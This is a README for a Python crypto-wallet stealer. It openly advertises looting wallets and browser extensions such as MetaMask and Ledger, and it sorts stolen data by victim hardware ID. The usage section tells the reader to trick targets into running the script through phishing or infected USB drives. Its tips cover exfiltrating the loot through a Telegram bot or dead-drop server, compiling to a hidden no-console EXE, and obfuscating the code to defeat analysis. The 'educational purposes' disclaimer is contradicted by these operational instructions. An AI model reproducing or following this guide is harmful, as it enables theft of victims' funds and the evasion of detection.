# 💰 Python_Wallet_Stealer
Silently loots crypto wallets and browser extensions like a digital pickpocket.
Steal everything. Leave nothing. Burn the evidence.

## ☢️ DISCLAIMER
THIS IS A CRIME ! Use it on your own devices  , and for educational/research purposes only. We do not endorse or support any illegal activities here

# 🔪 Features
## Process Killer: 
Murders 100+ browser/wallet processes (Chrome, MetaMask, Exodus, etc.) to unlock files.
HWID-Based Storage: Organizes stolen data by victim’s hardware ID.
Wallet Data Extraction: Robs Bitcoin, Ethereum, Exodus, AtomicWallet, and 20+ others.
Browser Extension Theft: Hijacks MetaMask, Phantom, Ledger, Trezor, and 50+ other extensions.
Self-Destruct: Auto-exits on non-Windows systems to avoid forensics.

## 🛠️ Installation
Clone this repo (use Tor fors safety ):
```Bash
git clone https://github.com/zacgule/wallet_stealer.git

```
Install dependencies:

```Bash
pip install -r requirements.txt
```

## 🩸 Usage
Deploy the payload:
Social-engineer the target to run wallet_stealer.py (phishing, infected USB, etc.).
Script kills processes, steals data, and dumps it to:
 ```
 C:\Users\[YourTarget]\Documents\[HardwareID]\Wallets
```
Exfiltrate data:
Scrape the Wallets folder for:
Raw wallet files (.dat, .json, .exe)
Browser extension configs (Local Storage, LevelDB)
PRO TIP: Zip + encrypt the loot, then exfil via Telegram bot or dead-drop server.

## 🚨 "Safety" Tips
Compile to EXE: Use PyInstaller to hide :
```Bash
pyinstaller --onefile --noconsole wallet_stealer.py
```
Obfuscate: 
```
Use https://pyob.oxyry.com/ to break decompilers.
```
## Additional Tip : 
Sandbox: Test in a VM isolated from your main network.

## ⚖️ Legal statement and Credits 
This repo is for educational purposes only. I don’t endorse crime. Credits to my friend Skid on Telegram of ReverseHell
